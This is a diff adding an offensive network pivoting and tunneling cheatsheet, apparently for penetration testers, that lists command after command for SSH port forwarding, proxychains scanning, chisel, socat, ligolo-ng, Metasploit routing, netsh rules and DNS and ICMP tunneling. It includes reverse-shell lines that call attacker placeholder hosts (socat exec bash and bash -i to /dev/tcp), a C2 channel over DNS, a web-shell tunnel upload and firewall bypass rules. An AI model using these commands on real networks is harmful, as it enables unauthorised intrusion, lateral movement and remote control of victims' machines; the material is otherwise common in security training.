@@ -1,0 +1,140 @@
+NETWORK PIVOTING AND TUNNELING CHEATSHEET
+
+OVERVIEW
+Pivoting means using a compromised machine to access networks that aren't directly reachable from your attacker machine.
+Tunneling means encapsulating traffic inside another protocol to bypass firewalls or route through systems.
+
+KEY CONCEPTS
+Pivot host = compromised machine that has access to another network segment
+Lateral movement = moving between machines in the same network
+Port forwarding = redirect traffic from one port/host to another
+SOCKS proxy = dynamic proxy that routes all traffic through a tunnel
+
+PORT FORWARDING WITH SSH
+
+Local port forward (access remote service via local port):
+ssh -L LOCAL_PORT:TARGET_IP:TARGET_PORT user@PIVOT_HOST
+Example: ssh -L 8080:192.168.2.10:80 user@10.10.10.5
+Access: http://127.0.0.1:8080 -> reaches 192.168.2.10:80 through pivot
+
+Remote port forward (expose your local port on remote machine):
+ssh -R REMOTE_PORT:LOCAL_IP:LOCAL_PORT user@PIVOT_HOST
+Example: ssh -R 4444:127.0.0.1:4444 user@10.10.10.5
+Useful: catch reverse shells through a jump host
+
+Dynamic port forward (SOCKS proxy, route all traffic):
+ssh -D 1080 user@PIVOT_HOST
+Configure proxychains to use 127.0.0.1:1080
+Then: proxychains nmap -sT -Pn 192.168.2.0/24
+
+SSH through jump host:
+ssh -J user@PIVOT_HOST user@INTERNAL_HOST
+Multi-hop: ssh -J user@hop1,user@hop2 user@target
+
+Keep tunnel alive:
+ssh -L 8080:target:80 -N -f user@pivot (-N no shell, -f background)
+
+PROXYCHAINS
+Config file: /etc/proxychains.conf or /etc/proxychains4.conf
+Add at bottom: socks5 127.0.0.1 1080
+Use: proxychains [command]
+Examples:
+proxychains nmap -sT -Pn -p 80,443,22 192.168.2.10
+proxychains curl http://192.168.2.10
+proxychains firefox (browse internal network)
+proxychains crackmapexec smb 192.168.2.0/24 -u user -p pass
+
+CHISEL (fast TCP/UDP tunneling over HTTP)
+Download: github.com/jpillora/chisel (get binary for your OS)
+
+Server (on attacker machine):
+./chisel server -p 8000 --reverse
+
+Client (on pivot host):
+./chisel client ATTACKER_IP:8000 R:socks (reverse SOCKS proxy)
+./chisel client ATTACKER_IP:8000 R:1080:socks (specify port)
+./chisel client ATTACKER_IP:8000 R:8080:192.168.2.10:80 (port forward)
+
+Then use proxychains with 127.0.0.1:1080
+
+SOCAT
+Port forward:
+socat TCP-LISTEN:8080,fork TCP:192.168.2.10:80
+
+Reverse shell relay:
+socat TCP-LISTEN:4444,fork TCP:ATTACKER_IP:4444
+
+Create PTY shell:
+socat file:`tty`,raw,echo=0 TCP:IP:PORT (attacker)
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:IP:PORT (victim)
+
+LIGOLO-NG (modern, agent-based pivoting)
+Start proxy on attacker: ./proxy -selfcert -laddr 0.0.0.0:11601
+Run agent on pivot: ./agent -connect ATTACKER_IP:11601 -ignore-cert
+In ligolo interface: session -> select session -> start
+Add route: ip route add 192.168.2.0/24 dev ligolo (on attacker)
+Now access internal network directly without proxychains
+
+METASPLOIT PIVOTING
+After getting meterpreter session on pivot:
+Add route: route add 192.168.2.0/24 [SESSION_ID]
+or: run post/multi/manage/autoroute
+SOCKS proxy: use auxiliary/server/socks_proxy -> set SRVPORT 1080 -> run
+Then use proxychains for further scanning
+
+Port forward in meterpreter:
+portfwd add -l 8080 -r 192.168.2.10 -p 80
+portfwd list
+portfwd delete -l 8080
+
+NETSH (Windows port forwarding, needs admin)
+Add rule: netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.2.10
+List rules: netsh interface portproxy show all
+Delete rule: netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
+Allow firewall: netsh advfirewall firewall add rule name="pivot" protocol=TCP dir=in localport=8080 action=allow
+
+PLINK (Windows SSH client for tunneling)
+plink.exe -L 8080:192.168.2.10:80 user@ATTACKER_IP
+plink.exe -D 1080 user@ATTACKER_IP
+plink.exe -R 4444:127.0.0.1:4444 user@ATTACKER_IP
+
+DNS TUNNELING (bypass restrictive firewalls)
+iodine: tunnel IP over DNS
+  Server: iodined -f -c -P password 10.0.0.1 tunnel.domain.com
+  Client: iodine -f -P password tunnel.domain.com
+dnscat2: C2 over DNS
+  Server: ruby dnscat2.rb domain.com
+  Client: ./dnscat domain.com
+
+ICMP TUNNELING
+ptunnel: tunnel TCP over ICMP ping packets
+  Server: ptunnel
+  Client: ptunnel -p SERVER_IP -lp 8080 -da TARGET_IP -dp 80
+
+HTTP TUNNELING
+reGeorg + proxychains: upload tunnel.php to webserver, tunnel through HTTP
+
+COMMON PIVOTING SCENARIOS
+
+Scenario 1: Access internal web server
+Attacker -> pivot (SSH) -> internal web:80
+ssh -L 8080:192.168.2.20:80 user@pivot
+Browse http://127.0.0.1:8080
+
+Scenario 2: Scan internal network
+ssh -D 1080 user@pivot
+proxychains nmap -sT -Pn 192.168.2.0/24
+
+Scenario 3: Get reverse shell from double-pivoted machine
+Machine A (attacker) <- Machine B (pivot1) <- Machine C (pivot2) <- Machine D (target)
+On B: socat TCP-LISTEN:4444,fork TCP:A_IP:4444
+On C: socat TCP-LISTEN:4444,fork TCP:B_IP:4444
+On D: bash -i >& /dev/tcp/C_IP/4444 0>&1
+Shell arrives at A listener
+
+TRANSFERRING FILES THROUGH PIVOTS
+Python HTTP server: python3 -m http.server 8000
+Through SSH tunnel: wget http://127.0.0.1:8081/file (after port forward)
+SCP through jump: scp -J pivot user@internal:/path/file .
+SMB server (impacket): smbserver.py share /path/to/files
+  Connect from Windows: copy \\ATTACKER_IP\share\file .
